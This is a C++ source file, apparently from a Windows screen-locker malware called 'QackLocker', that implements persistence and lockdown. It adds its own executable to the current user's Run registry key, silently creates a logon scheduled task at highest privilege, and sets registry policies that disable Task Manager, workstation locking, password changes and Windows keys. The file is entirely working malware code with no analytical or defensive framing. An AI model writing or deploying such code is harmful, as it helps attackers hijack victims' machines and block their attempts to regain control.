// language: C++, file: src/persistence.cpp
#include "persistence.h"
#include <windows.h>
#include <string>
#include <vector>

static bool reg_set_hkcu(const wchar_t* subkey, const wchar_t* name, const wchar_t* value) {
    HKEY k;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, subkey, 0, nullptr, 0,
                        KEY_SET_VALUE, nullptr, &k, nullptr) != ERROR_SUCCESS)
        return false;
    LONG r = RegSetValueExW(k, name, 0, REG_SZ,
                            reinterpret_cast<const BYTE*>(value),
                            (DWORD)((wcslen(value) + 1) * sizeof(wchar_t)));
    RegCloseKey(k);
    return r == ERROR_SUCCESS;
}

static bool reg_set_dword(const wchar_t* subkey, const wchar_t* name, DWORD value) {
    HKEY k;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, subkey, 0, nullptr, 0,
                        KEY_SET_VALUE, nullptr, &k, nullptr) != ERROR_SUCCESS)
        return false;
    LONG r = RegSetValueExW(k, name, 0, REG_DWORD,
                            reinterpret_cast<const BYTE*>(&value), sizeof(value));
    RegCloseKey(k);
    return r == ERROR_SUCCESS;
}

void install_autostart() {
    wchar_t exe[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exe, MAX_PATH);
    reg_set_hkcu(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                 L"QackLocker", exe);

    std::wstring cmd = L"schtasks /create /tn QackLocker /tr \"";
    cmd += exe;
    cmd += L"\" /sc onlogon /rl highest /f";

    STARTUPINFOW si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    std::vector<wchar_t> buf(cmd.begin(), cmd.end());
    buf.push_back(0);
    if (CreateProcessW(nullptr, buf.data(), nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void apply_reg_blocks() {
    reg_set_dword(L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  L"DisableTaskMgr", 1);
    reg_set_dword(L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  L"DisableLockWorkstation", 1);
    reg_set_dword(L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  L"DisableChangePassword", 1);
    reg_set_dword(L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
                  L"NoWinKeys", 1);
}
